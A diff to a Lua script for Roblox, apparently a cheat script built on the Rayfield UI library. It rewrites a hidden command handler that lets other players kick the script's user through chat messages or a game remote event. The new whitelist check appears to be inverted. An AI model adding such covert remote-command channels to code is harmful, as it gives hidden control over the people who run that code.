@@ -1039,7 +1039,7 @@ cmds = {
 	end,
 
 	["kick"] = function(Admin, Reason) 
-		if string.len(Reason) > 0 then
+		if Reason then
 			LocalPlayer:Kick(Reason)
 		else
 			LocalPlayer:Kick("The game thinks you're cheating so a black hole appeared and took you away.")
@@ -1068,28 +1068,35 @@ cmds = {
 }
 
 local function chat(player, message)
-	if player.Name ~= table.unpack(RayfieldLibrary.Whitelist) or not deb then return end
-	deb = true
-	local Lower = string.lower(message) 
-	if string.sub(Lower, 1, 1) == ":" then
-		local args = string.split(string.sub(Lower,2), " ")
-		local Command = table.remove(args, 1)
-		local Target = table.remove(args, 1)
-		local Data = table.concat(args, " ")
-		if Command and Target and type(Command) == "string" and type(Target) == "string" and cmds[Command] then
-			Command = string.lower(Command)
-			warn(Target)
-			if Target == LocalPlayer.Name:lower() or FindMatch(Target) == LocalPlayer or Target == "all" then
-				cmds[Command](player, Data)
-			end
-		end
+	if table.find(RayfieldLibrary.Whitelist, player.Name) then
+		return
 	end
-	wait(0.3)
-	deb = false
+    deb = true
+    local Lower = string.lower(message)
+    if string.sub(Lower, 1, 1) == ":" then
+        local args = string.split(string.sub(Lower, 2), " ")
+        local Command = table.remove(args, 1)
+        local Target = table.remove(args, 1)
+        local Data = table.concat(args, " ")
+        
+        if Command and Target and type(Command) == "string" and type(Target) == "string" and cmds[Command] then
+            Command = string.lower(Command)
+
+            if Target:lower() == LocalPlayer.Name:lower() or FindMatch(Target) == LocalPlayer or Target == "all" then
+                pcall(function()
+                    cmds[Command](player, Data)
+                end)
+            end
+        end
+    end
+    task.wait(0.3)
+    deb = false
 end
 
 ExtendGrabLine.OnClientEvent:Connect(function(Plr, Data)
-	if (player.Name ~= table.unpack(table.unpack(RayfieldLibrary.Whitelist)) or not deb) then return end
+	if table.find(RayfieldLibrary.Whitelist, player.Name) then
+		return
+	end
 	if Plr then 
 		local Lower = string.lower(Data) 
 		if string.sub(Lower, 1, 1) == ":" then 
